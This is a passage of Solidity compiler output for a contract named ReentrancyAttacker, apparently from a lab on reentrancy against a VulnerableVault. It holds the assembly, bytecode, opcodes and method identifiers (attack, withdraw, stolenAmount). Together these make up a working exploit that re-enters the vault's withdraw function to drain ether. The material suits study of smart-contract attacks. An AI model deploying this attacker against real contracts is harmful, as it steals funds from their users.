\"#utility.yul\":2953:2957   */\n      0x00\n        /* \"#utility.yul\":2991:2993   */\n      0x20\n        /* \"#utility.yul\":2980:2989   */\n      dup3\n        /* \"#utility.yul\":2976:2994   */\n      add\n        /* \"#utility.yul\":2968:2994   */\n      swap1\n      pop\n        /* \"#utility.yul\":3004:3097   */\n      tag_118\n        /* \"#utility.yul\":3094:3095   */\n      0x00\n        /* \"#utility.yul\":3083:3092   */\n      dup4\n        /* \"#utility.yul\":3079:3096   */\n      add\n        /* \"#utility.yul\":3070:3076   */\n      dup5\n        /* \"#utility.yul\":3004:3097   */\n      tag_73\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":2838:3104   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3110:3279   */\n    tag_74:\n        /* \"#utility.yul\":3194:3205   */\n      0x00\n        /* \"#utility.yul\":3228:3234   */\n      dup3\n        /* \"#utility.yul\":3223:3226   */\n      dup3\n        /* \"#utility.yul\":3216:3235   */\n      mstore\n        /* \"#utility.yul\":3268:3272   */\n      0x20\n        /* \"#utility.yul\":3263:3266   */\n      dup3\n        /* \"#utility.yul\":3259:3273   */\n      add\n        /* \"#utility.yul\":3244:3273   */\n      swap1\n      pop\n        /* \"#utility.yul\":3110:3279   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3285:3456   */\n    tag_75:\n        /* \"#utility.yul\":3425:3448   */\n      0x4e656564206174206c6561737420312065746865720000000000000000000000\n        /* \"#utility.yul\":3421:3422   */\n      0x00\n        /* \"#utility.yul\":3413:3419   */\n      dup3\n        /* \"#utility.yul\":3409:3423   */\n      add\n        /* \"#utility.yul\":3402:3449   */\n      mstore\n        /* \"#utility.yul\":3285:3456   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3462:3828   */\n    tag_76:\n        /* \"#utility.yul\":3604:3607   */\n      0x00\n        /* \"#utility.yul\":3625:3692   */\n      tag_122\n        /* \"#utility.yul\":3689:3691   */\n      0x15\n        /* \"#utility.yul\":3684:3687   */\n      dup4\n        /* \"#utility.yul\":3625:3692   */\n      tag_74\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":3618:3692   */\n      swap2\n      pop\n        /* \"#utility.yul\":3701:3794   */\n      tag_123\n        /* \"#utility.yul\":3790:3793   */\n      dup3\n        /* \"#utility.yul\":3701:3794   */\n      tag_75\n      jump\t// in\n    tag_123:\n        /* \"#utility.yul\":3819:3821   */\n      0x20\n        /* \"#utility.yul\":3814:3817   */\n      dup3\n        /* \"#utility.yul\":3810:3822   */\n      add\n        /* \"#utility.yul\":3803:3822   */\n      swap1\n      pop\n        /* \"#utility.yul\":3462:3828   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3834:4253   */\n    tag_53:\n        /* \"#utility.yul\":4000:4004   */\n      0x00\n        /* \"#utility.yul\":4038:4040   */\n      0x20\n        /* \"#utility.yul\":4027:4036   */\n      dup3\n        /* \"#utility.yul\":4023:4041   */\n      add\n        /* \"#utility.yul\":4015:4041   */\n      swap1\n      pop\n        /* \"#utility.yul\":4087:4096   */\n      dup2\n        /* \"#utility.yul\":4081:4085   */\n      dup2\n        /* \"#utility.yul\":4077:4097   */\n      sub\n        /* \"#utility.yul\":4073:4074   */\n      0x00\n        /* \"#utility.yul\":4062:4071   */\n      dup4\n        /* \"#utility.yul\":4058:4075   */\n      add\n        /* \"#utility.yul\":4051:4098   */\n      mstore\n        /* \"#utility.yul\":4115:4246   */\n      tag_125\n        /* \"#utility.yul\":4241:4245   */\n      dup2\n        /* \"#utility.yul\":4115:4246   */\n      tag_76\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":4107:4246   */\n      swap1\n      pop\n        /* \"#utility.yul\":3834:4253   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212200478d98d74b50bcf9f19c41385ab097b8b2e44fcc1e2480b8e0e683f36633b6164736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b506040516107b13803806107b1833981810160405281019061003191906100d4565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6106a58061010c5f395ff3fe608060405260043610610058575f3560e01c806312065fe0146101a95780633ccfd60b146101d3578063407c2821146101e95780639e5faafc14610213578063a533d40e1461021d578063fbfa77cf14610247576101a5565b366101a55760015f81548092919061006f90610469565b91905055503460025f82825461008591906104b0565b92505081905550670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100fe573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101229190610511565b106101a3575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561018c575f5ffd5b505af115801561019e573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b3480156101b4575f5ffd5b506101bd610271565b6040516101ca919061054b565b60405180910390f35b3480156101de575f5ffd5b506101e7610278565b005b3480156101f4575f5ffd5b506101fd6102be565b60405161020a919061054b565b60405180910390f35b61021b6102c4565b005b348015610228575f5ffd5b50610231610409565b60405161023e919061054b565b60405180910390f35b348015610252575f5ffd5b5061025b61040f565b60405161026891906105de565b60405180910390f35b5f47905090565b3373ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f193505050501580156102bb573d5f5f3e3d5ffd5b50565b60015481565b670de0b6b3a764000034101561030f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161030690610651565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610375575f5ffd5b505af1158015610387573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156103f1575f5ffd5b505af1158015610403573d5f5f3e3d5ffd5b50505050565b60025481565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f61047382610460565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036104a5576104a4610433565b5b600182019050919050565b5f6104ba82610460565b91506104c583610460565b92508282019050808211156104dd576104dc610433565b5b92915050565b5f5ffd5b6104f081610460565b81146104fa575f5ffd5b50565b5f8151905061050b816104e7565b92915050565b5f60208284031215610526576105256104e3565b5b5f610533848285016104fd565b91505092915050565b61054581610460565b82525050565b5f60208201905061055e5f83018461053c565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f6105a66105a161059c84610564565b610583565b610564565b9050919050565b5f6105b78261058c565b9050919050565b5f6105c8826105ad565b9050919050565b6105d8816105be565b82525050565b5f6020820190506105f15f8301846105cf565b92915050565b5f82825260208201905092915050565b7f4e656564206174206c65617374203120657468657200000000000000000000005f82015250565b5f61063b6015836105f7565b915061064682610607565b602082019050919050565b5f6020820190508181035f8301526106688161062f565b905091905056fea26469706673582212200478d98d74b50bcf9f19c41385ab097b8b2e44fcc1e2480b8e0e683f36633b6164736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x7B1 CODESIZE SUB DUP1 PUSH2 0x7B1 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x6A5 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x58 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x1A9 JUMPI DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x1D3 JUMPI DUP1 PUSH4 0x407C2821 EQ PUSH2 0x1E9 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x213 JUMPI DUP1 PUSH4 0xA533D40E EQ PUSH2 0x21D JUMPI DUP1 PUSH4 0xFBFA77CF EQ PUSH2 0x247 JUMPI PUSH2 0x1A5 JUMP JUMPDEST CALLDATASIZE PUSH2 0x1A5 JUMPI PUSH1 0x1 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x6F SWAP1 PUSH2 0x469 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP CALLVALUE PUSH1 0x2 PUSH0 DUP3 DUP3 SLOAD PUSH2 0x85 SWAP2 SWAP1 PUSH2 0x4B0 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH8 0xDE0B6B3A7640000 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x12065FE0 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xFE JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x122 SWAP2 SWAP1 PUSH2 0x511 JUMP JUMPDEST LT PUSH2 0x1A3 JUMPI PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x18C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x19E JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1B4 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x1BD PUSH2 0x271 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1CA SWAP2 SWAP1 PUSH2 0x54B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1DE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x1E7 PUSH2 0x278 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F4 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x1FD PUSH2 0x2BE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x20A SWAP2 SWAP1 PUSH2 0x54B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x21B PUSH2 0x2C4 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x228 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x231 PUSH2 0x409 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x23E SWAP2 SWAP1 PUSH2 0x54B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x252 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x25B PUSH2 0x40F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x268 SWAP2 SWAP1 PUSH2 0x5DE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x2BB JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x30F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x306 SWAP1 PUSH2 0x651 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x375 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x387 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3F1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x403 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x473 DUP3 PUSH2 0x460 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x4A5 JUMPI PUSH2 0x4A4 PUSH2 0x433 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4BA DUP3 PUSH2 0x460 JUMP JUMPDEST SWAP2 POP PUSH2 0x4C5 DUP4 PUSH2 0x460 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x4DD JUMPI PUSH2 0x4DC PUSH2 0x433 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x4F0 DUP2 PUSH2 0x460 JUMP JUMPDEST DUP2 EQ PUSH2 0x4FA JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x50B DUP2 PUSH2 0x4E7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x526 JUMPI PUSH2 0x525 PUSH2 0x4E3 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x533 DUP5 DUP3 DUP6 ADD PUSH2 0x4FD JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x545 DUP2 PUSH2 0x460 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x55E PUSH0 DUP4 ADD DUP5 PUSH2 0x53C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5A6 PUSH2 0x5A1 PUSH2 0x59C DUP5 PUSH2 0x564 JUMP JUMPDEST PUSH2 0x583 JUMP JUMPDEST PUSH2 0x564 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5B7 DUP3 PUSH2 0x58C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5C8 DUP3 PUSH2 0x5AD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5D8 DUP2 PUSH2 0x5BE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5F1 PUSH0 DUP4 ADD DUP5 PUSH2 0x5CF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E656564206174206C6561737420312065746865720000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x63B PUSH1 0x15 DUP4 PUSH2 0x5F7 JUMP JUMPDEST SWAP2 POP PUSH2 0x646 DUP3 PUSH2 0x607 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x668 DUP2 PUSH2 0x62F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DIV PUSH25 0xD98D74B50BCF9F19C41385AB097B8B2E44FCC1E2480B8E0E68 EXTCODEHASH CALLDATASIZE PUSH4 0x3B616473 PUSH16 0x6C634300081E00330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "340200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"attackCount()": "2447",
						"getBalance()": "312",
						"stolenAmount()": "2491",
						"vault()": "infinite",
						"withdraw()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"attackCount()": "407c2821",
					"getBalance()": "12065fe0",
					"stolenAmount()": "a533d40e",
					"vault()": "fbfa77cf",
					"withdraw()": "3ccfd60b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 102,
						"contract": "contracts/Reentrancy/VulnerableVault.sol:ReentrancyAttacker",
						"label": "vault",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(VulnerableVault)99"
					},
					{
						"astId": 104,
						"contract": "contracts/Reentrancy/VulnerableVault.sol:ReentrancyAttacker",
						"label": "attackCount",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					},
					{
						"astId": 106,
						"contract": "contracts/Reentrancy/VulnerableVault.sol:ReentrancyAttacker",
						"label": "stolenAmount",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_contract(VulnerableVault)99": {
						"encoding": "inplace",
						"label": "contract VulnerableVault",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}